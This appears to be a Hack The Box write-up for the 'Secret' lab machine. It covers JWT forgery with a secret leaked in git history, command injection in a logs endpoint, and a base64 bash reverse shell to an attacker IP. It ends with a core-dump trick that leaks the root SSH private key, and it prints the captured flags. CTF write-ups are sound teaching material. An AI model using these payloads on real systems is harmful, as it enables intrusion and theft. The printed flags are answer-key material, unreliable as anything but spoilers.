---
title: "Secret from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Secret from HTB
`nmap`gave this:
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp  open     http    Node.js (Express middleware)
|_http-title: DUMB Docs
```
from `80`port we can download source code which is on the bottom.
```bash
$ uznip file.zip
$ cd /local-web/.git
$ git log
-----
--------
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530
4b89867504baccd93a
    removed .env for security reasons

$  git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
ects/0f/e5720dbee18484942ab0d67ddfc9c0a160287             ects/f8/80e2b582071fdcf8f7
f3a81782c8275abc48
```
Then
```bash
git show
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
----
----------
+router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
+
+    if (name == 'theadmin'){
+        const getLogs = `git log --oneline ${file}`;
+        exec(getLogs, (err , output) =>{
+            if(err){
+                res.status(500).send(err);
+                return
+            }
+            res.json(output);
+        })
+    }
+    else{
+        res.json({
+            role: {
+                role: "you are normal user",
+                desc: userinfo.name.name
+            }
+        })
+    }
 })
```
reading the `local-web/routes/auth.js` we find this:
```js
// login

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})
```
This means that the `token_secret`that we got is `jwt`signature.
On site there `/docs`there is how token should look like so lets built it that way
Create an `jwt`token with this
```js
Header
 {
  "alg": "HS256",
  "typ": "JWT"
}

Payload
{
"_id": "31313131",
  "name" : "theadmin",
  "email" : "root@dasith.works",
  "iat" : 1628727669
}

VERIFY SIGNATURE
 gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

```
and i got
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJoZWxwQGh0Yi5jb20ifQ.FIzE8SZ-bVd5CGgBKKZLgwDoKluGptKT4K2gsPH0fGU
```
then i used `burpsuite + repeater` to check if i would be admin
```
GET /api/priv HTTP/1.1
Host: 10.10.11.120
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIzMTMxMzEzMSIsIm5hbWUiOiJ0aGVhZG1pbiIsImVtYWlsIjoicm9vdEBkYXNpdGgud29ya3MiLCJpYXQiOjE2Mjg3Mjc2Njl9.12tqqp2h6h_GuYX7THeeF4taq71NA9B4HH2oi1PvpNE
```
And i got
```js
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```
This means we have admin token and can do things
in this directory we can do this with same payload
```
GET /api/logs?file=;id HTTP/1.1
```
and response will be
```
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```
This means we can do `RCE` to get reverse shell. In burp do this
```
GET /api/logs?file=; echo -n 'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8xMjM0ICAwPiYx' | base64 -d | bash HTTP/1.1
```
`url-encode`that and we will get `reverse shell`
```
GET /api/logs?file=;echo+-n+'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8xMjM0ICAwPiYx'+|+base64+-d+|+bash HTTP/1.1
```
on `netcat`
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.120] 37276
bash: cannot set terminal process group (1115): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ script /dev/null -c bash
```
***
User Flag is: 28ae49669c844ba862cd52c38ec85a77
***
do `ssh-keygen`if you want `ssh`connection
`linpeas.sh`showed that there is an unusual binary in `/opt`which is named `count`which reads files and tells `how many words, lines there are` reading the source code which is `code.c`
```
// Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
```
This means that we have to do `coredump`and we will be able to read the file.
```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps -ef | grep count
root         783       1  0 13:11 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
dasith     96640   32354  0 15:12 pts/0    00:00:00 ./count
dasith     96644   32354  0 15:12 pts/0    00:00:00 grep --color=auto count
dasith@secret:/opt$ kill -11 96640
dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
```
It dumped now go to `/var/crash/_opt_count.1000.crash`and read the `coredump` with strings
```bash
strings Coredump



-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Copy this and save it to file for connection on `ssh`
```bash
nvim root_id_rsa
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.10.11.120
root@secret:~# pwd
/root
```
***
Root Flag is: c638a7445a495db2cadf198de687e5d8
***
I accidentally deleted `photo` :(
